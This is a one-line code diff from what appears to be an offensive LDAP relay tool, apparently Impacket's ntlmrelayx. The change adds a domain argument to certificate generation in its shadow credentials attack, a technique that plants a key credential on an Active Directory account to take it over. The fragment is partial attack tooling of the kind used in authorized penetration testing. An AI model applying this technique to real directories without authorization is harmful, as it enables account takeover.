@@ -311,7 +311,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget)
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, domain=domain)
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
         keyCredential = shadow_credentials.KeyCredential(key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
